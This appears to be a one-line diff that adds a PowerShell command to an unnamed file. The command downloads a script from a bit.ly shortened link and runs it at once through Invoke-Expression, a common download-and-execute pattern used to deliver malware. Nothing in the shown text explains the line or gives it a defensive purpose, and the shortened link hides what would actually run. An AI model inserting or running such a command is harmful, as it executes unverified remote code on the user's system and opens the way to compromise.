@@ -1,0 +1,1 @@
+`iex ((New-Object System.Net.WebClient).DownloadString('https://bit.ly/3rgUT1N'))`
